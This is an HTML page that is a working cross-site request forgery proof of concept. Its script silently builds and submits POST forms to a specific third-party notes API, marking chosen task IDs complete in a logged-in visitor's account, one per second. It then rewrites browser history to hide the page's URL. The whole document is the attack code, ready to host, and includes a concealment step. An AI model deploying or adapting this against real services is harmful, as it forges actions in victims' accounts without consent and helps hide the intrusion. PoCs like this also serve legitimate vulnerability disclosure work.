<html>
  <body>
    <script>
      // <-- Replace these with the task IDs you want to mark as complete -->
      const noteIDs = [28715264,28715277]; // Replace with your target task IDs
      
      const actionUrl = "https://inspectivgpt.filevinegov.com/api/notes/";
      const delayMs = 1000; // ms between requests

      noteIDs.forEach((noteID, i) => {
        setTimeout(() => {
          const form = document.createElement("form");
          form.action = `${actionUrl}${noteID}/complete`;
          form.method = "POST";
          form.target = "_blank"; // Opens in new tabs

          const addHidden = (name, value) => {
            const input = document.createElement("input");
            input.type = "hidden";
            input.name = name;
            input.value = value;
            form.appendChild(input);
          };

          // Note: If this endpoint requires any parameters in the body,
          // add them here using addHidden(). For example:
          // addHidden("parameterName", "parameterValue");
          
          // If the endpoint accepts an empty POST body, no hidden fields are needed
          // but we'll keep the form structure ready for any parameters

          document.body.appendChild(form);
          form.submit();

          // cleanup: remove form after short delay
          setTimeout(() => {
            if (form.parentNode) form.parentNode.removeChild(form);
          }, 5000);
        }, i * delayMs);
      });

      // hide PoC URL from history
      history.pushState('', '', '/');
    </script>
  </body>
</html>
